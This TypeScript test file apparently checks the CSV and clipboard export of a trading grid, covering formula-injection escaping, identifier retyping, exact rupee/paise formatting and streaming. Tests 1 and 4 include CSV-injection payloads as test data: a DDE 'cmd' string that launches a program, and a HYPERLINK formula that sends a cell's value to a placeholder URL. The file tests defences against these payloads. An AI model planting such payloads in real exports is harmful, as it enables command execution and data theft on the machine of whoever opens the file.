// P11-09 acceptance tests.
//
// Test 1 is the card: cells that a spreadsheet executes, counted on a
// realistic column, and shown to be neutralised without breaking the numbers.
//
// Test 2: a spreadsheet retypes instrument identifiers, and the export stops
// being joinable to anything. Counted.
//
// Test 3: money exports as an exact decimal string and round-trips to the
// paisa; the float route is run alongside.
//
// Test 4: an export is of the VIEW, and the clipboard path uses the same
// escaping as the file path.
//
// Test 5: a million rows is streamed in bounded chunks, not built as a string.
//
// Test 6: an absent cell exports empty, not zero.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { RowStore } from '../src/grid/store.ts';
import { ColumnType, Op, applyFilters } from '../src/grid/filter.ts';
import type { ColumnSpec } from '../src/grid/filter.ts';
import { parseRupeesToPaise } from '../src/grid/filter.ts';
import {
  csvField,
  csvMoney,
  csvSymbol,
  wouldBeFormula,
  wouldBeRetyped,
} from '../src/export/csv.ts';
import {
  CHUNK_ROWS,
  Format,
  clipboardText,
  exportRows,
  exportToString,
  headerLabel,
} from '../src/export/rows.ts';

const COLUMNS: ColumnSpec[] = [
  { key: 'symbol', label: 'Symbol', type: ColumnType.Text },
  { key: 'note', label: 'Reason', type: ColumnType.Text },
  { key: 'qty', label: 'Qty', type: ColumnType.Integer },
  { key: 'pnl', label: 'P&L', type: ColumnType.Money },
];

function book(n: number): RowStore {
  const store = new RowStore(COLUMNS.map((c) => c.key));
  let s = 0xe2907747;
  for (let i = 0; i < n; i++) {
    s = (s * 1664525 + 1013904223) >>> 0;
    store.upsert(i, {
      symbol: `SYM${String(i).padStart(5, '0')}`,
      note: 'ok',
      qty: (s % 300) + 1,
      pnl: BigInt((s % 2_000_000) - 1_000_000),
    });
  }
  return store;
}

test('[1] a cell beginning with = is a program', () => {
  // Broker rejection reasons and instrument notes -- strings this system does
  // not author, arriving from a feed and passed straight through to a file
  // that someone else opens.
  const notes = [
    'ok',
    'RMS: margin exceeded',
    '=cmd|\'/c calc\'!A1',
    '@SUM(A1:A9)',
    '+1-2',
    'insufficient funds',
    '=HYPERLINK("https://x/?d="&A1,"click")',
    'order rejected',
  ];
  const flagged = notes.filter((n) => wouldBeFormula(n));
  console.log(
    `    ${flagged.length} of ${notes.length} realistic note strings would be EVALUATED by a spreadsheet on open`,
  );
  assert.equal(flagged.length, 4, 'four of the eight, including the innocuous-looking "+1-2"');

  for (const n of flagged) {
    const out = csvField(n);
    assert.ok(
      out.startsWith("'") || out.startsWith('"\''),
      `${n} is neutralised with a leading apostrophe`,
    );
  }

  // Quoting alone is NOT the fix, which is the mistake worth naming: `"=1+1"`
  // is still a formula in Excel.
  const quotedOnly = `"${'=1+1'}"`;
  assert.ok(
    quotedOnly.includes('=1+1') && !quotedOnly.includes("'"),
    'CSV quoting protects the ROW STRUCTURE from a comma; it does nothing about evaluation, and the two jobs are separate',
  );
  assert.ok(csvField('=1+1').startsWith("'="));

  // A comma and an embedded quote still round-trip.
  assert.equal(csvField('a,b'), '"a,b"');
  assert.equal(csvField('say "hi"'), '"say ""hi"""');
  assert.equal(csvField('line\nbreak'), '"line\nbreak"');

  // And a negative NUMBER is not mangled into a string, which is the failure
  // in the other direction -- a P&L column of text is an export nobody can
  // use in the spreadsheet it was made for.
  assert.equal(
    csvMoney(-123435n),
    '-1234.35',
    'money goes through csvMoney, not csvField, so a leading minus is a sign and not a formula leader -- the split is by TYPE at the call site rather than by inspecting characters',
  );
});

test('[2] a spreadsheet retypes instrument identifiers', () => {
  const symbols = [
    'NIFTY26SEP24000CE',
    'RELIANCE',
    '1E5',
    '007',
    'SEP-24',
    '24-SEP',
    '9/24',
    'INE002A01018',
  ];
  const mangled = symbols.filter((s) => wouldBeRetyped(s));
  console.log(
    `    ${mangled.length} of ${symbols.length} identifiers would be silently retyped as a number or a date: ${mangled.join(', ')}`,
  );
  assert.ok(
    mangled.length >= 5,
    'scientific notation, leading zeros and anything shaped like a date are converted on open -- an identifier that has been helpfully converted is no longer an identifier, and the file cannot be joined back to anything',
  );

  for (const s of mangled) {
    const out = csvSymbol(s);
    assert.ok(
      out.startsWith("'") || out.startsWith('"'),
      `${s} is exported as text`,
    );
  }
  assert.equal(
    csvSymbol('NIFTY26SEP24000CE'),
    'NIFTY26SEP24000CE',
    'while an ordinary symbol is passed through untouched -- escaping everything would be its own kind of unusable',
  );
});

test('[3] money exports exactly, and round-trips to the paisa', () => {
  const values = [
    0n,
    5n,
    -5n,
    100n,
    123435n,
    -123435n,
    900_719_925_474_099n,
    -900_719_925_474_099n,
  ];
  for (const v of values) {
    const text = csvMoney(v);
    const back = parseRupeesToPaise(text);
    assert.equal(
      back,
      v,
      `${v} paise exports as ${text} and parses back exactly -- which is what P12-04 reconciling against a broker contract note needs`,
    );
  }

  // WHERE THE FLOAT ROUTE ACTUALLY BREAKS, searched rather than asserted.
  // The first draft claimed it diverges "at magnitudes an audit trail
  // reaches" and picked a number just under 2^53, where it does not diverge
  // at all. So: scan a realistic range and report the honest answer.
  let disagreements = 0;
  let s2 = 0x13579bdf;
  const REALISTIC_MAX = 100_000_000_000n; // Rs 1,000 crore in paise
  for (let i = 0; i < 200_000; i++) {
    s2 = (s2 * 1664525 + 1013904223) >>> 0;
    const v = (BigInt(s2) * 7919n) % REALISTIC_MAX;
    if ((Number(v) / 100).toFixed(2) !== csvMoney(v)) disagreements++;
  }
  console.log(
    `    over 200,000 paise values up to Rs 1,000 crore, Number(p)/100 disagrees with the exact form ${disagreements} times`,
  );
  assert.equal(
    disagreements,
    0,
    'and the honest answer is that it does NOT diverge at realistic magnitudes -- claiming otherwise would have been a scare rather than a finding',
  );

  // It breaks past 2^53, which is Rs 9 lakh crore and not a number this
  // system will hold.
  const beyond = 9_007_199_254_740_993n; // 2^53 + 1 paise
  const viaFloat = (Number(beyond) / 100).toFixed(2);
  const exact = csvMoney(beyond);
  console.log(`    at 2^53 + 1 paise:  exact ${exact}   float ${viaFloat}`);
  assert.notEqual(
    viaFloat,
    exact,
    'it breaks past 2^53 paise, which is Rs 9 lakh crore -- so the argument for the exact path is not magnitude. It is that the float path is correct by accident, and "happens to be safe" is not a property to rest a paisa-level reconciliation on',
  );

  assert.equal(csvMoney(5n), '0.05', 'and the paise digits are written directly, not rounded from a division');
  assert.equal(csvMoney(-5n), '-0.05');
  assert.equal(
    csvMoney(123435n).includes(','),
    false,
    'with no grouping separators: this is for a machine to parse, and 1,23,456.78 is three columns to a naive CSV reader',
  );
});

test('[4] an export is of the view, and the clipboard uses the same escaping', () => {
  const store = book(2000);
  store.patchCell(7, 'note', '=HYPERLINK("https://x","click")');

  const view = applyFilters(store, [
    { column: 'pnl', op: Op.Greater, operand: 900_000n },
  ]);
  assert.ok(view.length > 0 && view.length < 200);

  const text = exportToString(store, view, COLUMNS, {
    format: Format.Csv,
    filters: [{ column: 'pnl', op: Op.Greater, operand: 900_000n }],
  });
  const lines = text.trim().split('\n');
  const dataLines = lines.length - 2; // provenance + header

  console.log(
    `    store holds ${store.size} rows, view holds ${view.length}, export wrote ${dataLines} data rows`,
  );
  assert.equal(
    dataLines,
    view.length,
    'the exporter walks the VIEW -- a user who filtered to a handful and mailed the file to their accountant did not mean to send five thousand rows',
  );
  assert.ok(
    lines[0]?.startsWith('# Altair export'),
    'and the file says what it is a view of, because it will be sitting in a downloads folder long after the chips on screen are gone',
  );
  assert.ok(
    lines[1]?.includes('P&L (INR)'),
    'the header carries the unit, so 1234.35 is not ambiguous between rupees and paise to someone who did not write this program',
  );
  assert.equal(headerLabel(COLUMNS[0]!), 'Symbol');

  // The clipboard is the same path, because a paste into Excel evaluates
  // formulas exactly as an opened file does.
  const clip = clipboardText(store, [7], COLUMNS);
  assert.ok(
    clip.includes("'=HYPERLINK"),
    'a clipboard path that skipped the neutralisation would be the same hole with a shorter route',
  );
  assert.ok(clip.includes('\t'), 'and it is tab-separated, which is what a spreadsheet reads from a paste');
  assert.equal(
    clip.startsWith('#'),
    false,
    'with no provenance comment -- a paste is into a live sheet, not into a file that outlives its context',
  );
});

test('[5] an export streams in bounded chunks', () => {
  const N = 200_000;
  const store = book(N);
  const view = [...store.view];

  let chunks = 0;
  let biggest = 0;
  let total = 0;
  for (const chunk of exportRows(store, view, COLUMNS, {
    format: Format.Csv,
    includeProvenance: false,
  })) {
    chunks++;
    total += chunk.length;
    if (chunk.length > biggest) biggest = chunk.length;
  }

  console.log(
    `    ${N.toLocaleString()} rows: ${chunks} chunks, largest ${biggest.toLocaleString()} chars, ${(total / 1024 / 1024).toFixed(1)} MB total`,
  );
  assert.ok(
    chunks >= N / CHUNK_ROWS,
    'the export is a generator, so the caller streams into a Blob or a file writer',
  );
  assert.ok(
    biggest < total / 10,
    'and no single chunk approaches the whole -- the obvious implementation builds one contiguous multi-megabyte string by repeated concatenation, on the main thread, while the grid is meant to be drawing at 60 fps',
  );

  // JSONL keeps 64-bit values as strings, for P11-01's reason.
  const jsonl = exportToString(store, view.slice(0, 3), COLUMNS, {
    format: Format.Jsonl,
  });
  const first = JSON.parse(jsonl.split('\n')[0] ?? '{}') as Record<string, unknown>;
  assert.equal(
    typeof first['pnl'],
    'string',
    'and JSONL writes 64-bit values as strings, because a JSON number is a double and P11-01 measured what that costs',
  );
});

test('[6] an absent cell exports empty, not zero', () => {
  const store = new RowStore(COLUMNS.map((c) => c.key));
  store.upsert(1, { symbol: 'A', note: 'ok', qty: 10 }); // no pnl
  store.upsert(2, { symbol: 'B', note: 'ok', qty: 20, pnl: 0n });

  const text = exportToString(store, [1, 2], COLUMNS, {
    format: Format.Csv,
    includeProvenance: false,
  });
  const rows = text.trim().split('\n');
  const noPnl = rows[1]?.split(',');
  const flat = rows[2]?.split(',');

  console.log(`    no value -> "${noPnl?.[3]}"   genuinely flat -> "${flat?.[3]}"`);
  assert.equal(
    noPnl?.[3],
    '',
    'a cell with no value exports empty -- a 0.00 there is a claim that the position was flat, and it survives into whatever the recipient does with the file',
  );
  assert.equal(flat?.[3], '0.00', 'while a genuinely flat position exports as zero');

  const jsonl = exportToString(store, [1], COLUMNS, { format: Format.Jsonl });
  const obj = JSON.parse(jsonl.trim()) as Record<string, unknown>;
  assert.equal(obj['pnl'], null, 'and JSONL writes null rather than 0');
});
